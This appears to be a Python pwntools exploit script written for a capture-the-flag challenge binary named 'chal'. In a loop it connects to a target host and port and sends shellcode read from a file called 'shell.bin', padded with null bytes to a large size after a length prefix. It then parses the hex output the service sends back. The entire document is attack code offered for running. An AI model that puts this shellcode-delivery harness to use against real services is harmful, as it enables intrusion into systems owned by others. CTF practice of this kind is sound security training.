from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./chal"

context.terminal = ["tmux", "splitw", "-h"]
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  #r = process(bin_name) #, env = {})
  script = """
  set follow-fork-mode child
  """
  r = gdb.debug (bin_name, gdbscript=script);


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

#elf = ELF (bin_name);
#context.word_size = elf.elfclass

#libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

#context.log_level = 'debug'

def rr ():
  r.recvuntil (": ")

def menu (idx):
  rr ()
  r.sendline (str(idx))

with open ("shell.bin", "rb") as f:
  data = f.read()
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)
r.close ()

while True:
  r = remote(sys.argv[1], int(sys.argv[2]))
  #r = process ("./chal")
  ll = len(data) + 0x400 * 0x1000
  r.sendafter ("||sc\n", p32(ll))
#do_debug ()
  r.sendline(data.ljust (0x1000*0x401 -1, "\x00"))

  while True:
    try:
      dd = r.recvline ()[:-1]
      if "done" in dd:
        r.close ()
        break
      ii = int(dd.split(":")[0], 16)
      if (ii < 0x80 and ii >= 0x20 or ii==0x0):
        print chr(ii), int(dd.split(":")[1], 16)
      elif ii > 0x100:
        print hex(ii)
    except:
      r.close ()
      break

